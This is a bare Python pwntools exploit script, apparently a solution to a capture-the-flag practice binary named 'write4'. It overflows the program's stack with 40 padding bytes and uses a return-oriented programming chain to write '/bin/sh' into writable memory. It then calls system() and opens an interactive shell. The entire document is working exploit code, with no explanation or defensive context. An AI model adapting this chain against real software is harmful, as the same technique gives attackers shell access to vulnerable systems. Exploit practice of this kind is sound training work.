from pwn import *

context.log_level = 'debug'
p = process("./write4")

system_plt = 0x004005e0
data_addr = 0x0000000000601050
mov_r14p_r15 = 0x0000000000400820
pop_r14_r15 = 0x0000000000400890
pop_rdi = 0x0000000000400893

payload = ''
payload += "A"*40
payload += p64(pop_r14_r15)
payload += p64(data_addr)
payload += "/bin/sh\x00"
payload += p64(mov_r14p_r15)

payload += p64(pop_rdi)
payload += p64(data_addr)
payload += p64(system_plt)

p.sendline(payload)
p.interactive()
